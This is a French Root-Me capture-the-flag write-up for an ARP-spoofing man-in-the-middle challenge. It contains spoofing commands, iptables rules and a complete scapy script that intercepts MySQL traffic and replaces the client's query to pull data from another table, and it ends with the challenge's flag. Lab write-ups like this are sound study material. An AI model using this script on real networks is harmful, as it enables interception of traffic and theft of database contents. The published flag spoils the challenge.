# ARP Spoofing - Homme du milieu — Write-up

**Plateforme :** Root-Me
**Challenge :** ARP Spoofing - Homme du milieu (difficile)
**Catégorie :** Réseau

## Description

Un client se connecte périodiquement à une base de données MySQL sur le même LAN. Le mot de passe est trop complexe pour être cracké. On dispose d'une machine attaquante sur le même réseau. Le flag se trouve dans la base de données.

## Environnement

- **Attaquant** : 172.18.0.3 (02:42:ac:12:00:03)
- **Client** : 172.18.0.2 (02:42:ac:12:00:02)
- **DB MySQL** : 172.18.0.4 (02:42:ac:12:00:04)

Le client exécute toutes les ~10 minutes :

```sql
SELECT flag FROM flag limit 0,1
```

qui retourne "Not the flag yet but close!".

## Approche

Le mot de passe MySQL utilise `mysql_native_password` (challenge-response SHA1), impossible à lire en clair. L'idée est de faire un Man-in-the-Middle via ARP spoofing et de **modifier la requête SQL en transit** pour interroger d'autres tables.

## Étape 1 : ARP Spoofing

Lancement du spoofer ARP dans les deux sens avec le script Python basé sur scapy (https://github.com/davidlares/arp-spoofing) :

```bash
python3 spoofer.py -t 172.18.0.2 -s 172.18.0.4 -i eth0 &
python3 spoofer.py -t 172.18.0.4 -s 172.18.0.2 -i eth0 &
```

Vérification avec tcpdump :

```bash
tcpdump -i eth0 port 3306 -c 10
```

## Étape 2 : Bloquer le forwarding kernel

Pour éviter que le paquet original arrive à la DB en même temps que le modifié :

```bash
iptables -A FORWARD -p tcp --dport 3306 -j DROP
iptables -A FORWARD -p tcp --sport 3306 -j DROP
```

## Étape 3 : Script MITM avec scapy

Le script intercepte tout le trafic MySQL, le forwarde manuellement, et modifie la requête SQL au passage.

Point clé : quand on change la requête SQL, il faut reconstruire l'en-tête MySQL (4 bytes) :
- Bytes 0-2 : longueur du payload (little-endian)
- Byte 3 : numéro de séquence (à conserver de l'original)
- Byte 4 : commande (0x03 = COM_QUERY)

Scapy recalcule automatiquement les longueurs IP et checksums TCP/IP avec `del pkt[IP].len`, `del pkt[IP].chksum`, `del pkt[TCP].chksum`.

### Énumération : SHOW TABLES

Première modification pour lister les tables :

```python
NEW_QUERY = b'SHOW TABLES'
```

Résultat : deux tables dans `flagdb` :
- `flag` (contient "Not the flag yet but close!")
- `the_flag_would_never_really_be_here_right`

### Exfiltration du flag

Deuxième modification pour lire la bonne table :

```python
NEW_QUERY = b'SELECT * FROM the_flag_would_never_really_be_here_right'
```

### Script complet

```python
from scapy.all import *
import struct

NEW_QUERY = b'SELECT * FROM the_flag_would_never_really_be_here_right'

def get_dst_mac(ip):
    if ip == '172.18.0.2':
        return '02:42:ac:12:00:02'
    elif ip == '172.18.0.4':
        return '02:42:ac:12:00:04'
    return 'ff:ff:ff:ff:ff:ff'

def process_packet(pkt):
    if not pkt.haslayer(IP):
        return
    if pkt[IP].src == '172.18.0.3':
        return
    dst_mac = get_dst_mac(pkt[IP].dst)
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        payload = pkt[Raw].load
        if b'SELECT flag FROM flag limit 0,1' in payload:
            seq_byte = payload[3:4]
            mysql_len = struct.pack('<I', len(NEW_QUERY) + 1)[:3]
            new_payload = mysql_len + seq_byte + b'\x03' + NEW_QUERY
            print('[+] MATCH! Replacing query')
            pkt[Raw].load = new_payload
        if len(pkt[Raw].load) > 10:
            print('[i]', pkt[IP].src, '->', pkt[IP].dst, pkt[Raw].load)
    del pkt[IP].len
    del pkt[IP].chksum
    if pkt.haslayer(TCP):
        del pkt[TCP].chksum
    sendp(Ether(src=pkt[Ether].dst, dst=dst_mac)/pkt[IP], iface='eth0', verbose=0)

print('[*] Forwarding MySQL traffic manually...')
sniff(iface='eth0', filter='tcp port 3306 and not host 172.18.0.3',
      prn=process_packet, store=0, timeout=900)
```

## Difficultés

1. **Conteneur Docker** : `/proc/sys/net/ipv4/ip_forward` en read-only, ettercap ne fonctionne pas correctement
2. **Forwarding manuel** : le kernel forwarde les paquets originaux en parallèle → il faut dropper avec iptables et tout forwarder via scapy
3. **En-tête MySQL** : changer la taille de la requête nécessite de recalculer les 3 bytes de longueur et conserver le sequence number original, sinon la DB répond "Got packets out of order"

## Flag

Le flag est retourné dans la réponse de la DB à la requête `SELECT * FROM the_flag_would_never_really_be_here_right`.
FLAG : RM{pr0xy1ng_r3qu3s75_4_fUn_4nd_pr0f1t!}
